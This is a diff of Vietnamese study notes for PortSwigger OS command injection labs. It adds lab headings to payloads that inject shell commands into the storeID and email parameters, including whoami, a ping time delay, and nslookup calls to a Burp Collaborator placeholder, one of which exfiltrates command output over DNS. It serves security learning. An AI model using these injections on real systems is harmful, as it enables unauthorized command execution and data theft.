@@ -12,17 +12,23 @@ source_collection: notion_portswigger
 Created by: Nguyễn Giang Nam
 Topics: Server-side
 
+# **Lab 01: OS command injection, simple case**
+
 Sửa tham số `storeID` thành
 
 ```jsx
 1|whoami
 ```
 
+# **Lab 02: Blind OS command injection with time delays**
+
 Thanh đổi tham số `email`
 
 ```jsx
 email=x||ping+-c+10+127.0.0.1||
 ```
+
+# **Lab 03: Blind OS command injection with output redirection**
 
 ```jsx
 ╔═══════════════════════════════════════════════════════════════════════╗
@@ -86,9 +92,13 @@ email=x||ping+-c+10+127.0.0.1||
      ▼                                                      ▼
 ```
 
+# **Lab 04: Blind OS command injection with out-of-band interaction**
+
 ```jsx
 email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
 ```
+
+# **Lab 05: Blind OS command injection with out-of-band data exfiltration**
 
 ```jsx
 email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
